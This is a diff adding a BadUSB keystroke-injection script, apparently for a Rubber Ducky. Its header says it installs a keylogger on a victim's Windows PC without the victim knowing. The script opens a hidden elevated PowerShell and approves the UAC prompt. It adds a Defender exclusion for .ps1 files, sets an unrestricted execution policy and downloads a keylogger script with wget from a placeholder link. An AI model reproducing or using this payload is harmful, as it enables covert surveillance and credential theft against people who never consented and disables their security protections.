@@ -1,0 +1,47 @@
+REM
+REM Author:      katekyy (Discord: katekyy#7129)
+REM
+REM Description: This script allows you to inject a keylogger into a victim's PC
+REM Description: so that the victim wouldn't know where it is located. (It's located in: C:\
+REM
+REM Version:     1.0
+REM
+REM Os type:     Windows
+REM
+REM Category:    Misc
+REM
+
+DELAY 2500
+GUI d
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell.exe -windowstyle hidden
+DELAY 200
+CTRL SHIFT ENTER
+DELAY 5000
+LEFT
+DELAY 150
+ENTER
+DELAY 5000
+STRING cd C:\Users\Public\Documents
+ENTER
+STRING Add-MpPreference -ExclusionExtension ps1 -Force
+ENTER
+STRING Set-ExecutionPolicy unrestricted -Force
+ENTER
+STRING echo "script.ps1" >> config.txt
+ENTER
+STRING echo "C:\Users\Public\Documents" >> config.txt
+ENTER
+STRING echo "downloader.TRUE" >> config.txt
+ENTER
+STRING echo 
+REM ===============================
+STRING "**LINK TO THE KEYLOGGER**" 
+REM ===============================
+STRING >> config.txt
+ENTER
+STRING wget {}{}{}{} -OutFile script.ps1
+ENTER
+DELAY 3500
